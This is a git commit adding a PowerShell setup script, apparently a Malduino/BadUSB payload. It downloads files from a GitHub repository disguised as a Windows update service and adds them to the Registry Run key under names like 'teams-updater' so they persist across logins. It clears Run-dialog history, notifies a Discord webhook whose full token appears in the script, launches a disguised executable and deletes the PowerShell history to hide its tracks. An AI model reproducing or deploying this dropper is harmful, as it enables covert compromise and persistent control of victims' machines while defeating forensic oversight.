be053bdfc20430087796856839e0b86e8c8f4f40
Dejanoator <dejanoator@gmail.com>
2023-06-18 17:36:57 +0200

    setup.ps1

---
+++ setup.ps1
@@ -0,0 +1,33 @@
+# Command 1
+$data = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/DanielAckermann69/WindowsUpdateService/main/redownload.txt'
+
+# Command 2
+New-Item -Path "C:/Users/$env:USERNAME/Documents/w.bat"
+Set-Content -Path "C:/Users/$env:USERNAME/Documents/w.bat" -Value $data.Content
+
+# Command 3
+Start-Sleep -Seconds 5
+New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Run -Name "teams-updater" -Value "C:\Users\$env:USERNAME\Documents\w.bat" -PropertyType String
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Command 4
+$webhookUrl = 'https://discord.com/api/webhooks/1100407460491169862/Wb_kr_f72PHdI5HhozZXMRekfr9XPtdXtw4TWjPLZARjT4sD0TraoPpuxhf8N2FNTY4E'
+$message = "Malduino w hat den download beim User $env:USERNAME gestarted. @everyone"
+$body = @{content = $message} | ConvertTo-Json
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
+
+# Command 5
+taskkill -im WindowsUpdateService.exe -f
+Remove-Item -Path "C:/Users/$env:USERNAME/AppData/Roaming/__browsergame__/WindowsUpdateService-main" -Recurse -Force
+New-Item -ItemType "directory" -Path "C:/Users/$env:USERNAME/AppData/Roaming/__browsergame__"
+
+# Command 6
+Invoke-WebRequest -Uri "https://github.com/DanielAckermann69/WindowsUpdateService/archive/refs/heads/main.zip" -OutFile "C:/Users/$env:USERNAME/AppData/Roaming/__browsergame__/v2.zip"
+Expand-Archive -Path "C:/Users/$env:USERNAME/AppData/Roaming/__browsergame__/v2.zip" -DestinationPath "C:/Users/$env:USERNAME/AppData/Roaming/__browsergame__"
+
+# Command 7
+New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Run -Name "start" -Value "C:\Users\$env:USERNAME\AppData\Roaming\__browsergame__\WindowsUpdateService-main\WindowsUpdateService.exe" -PropertyType String
+"C:/Users/$env:USERNAME/AppData/Roaming/__browsergame__/WindowsUpdateService-main/WindowsUpdateService.exe"
+
+# Command 8
+Remove-Item (Get-PSReadlineOption).HistorySavePath
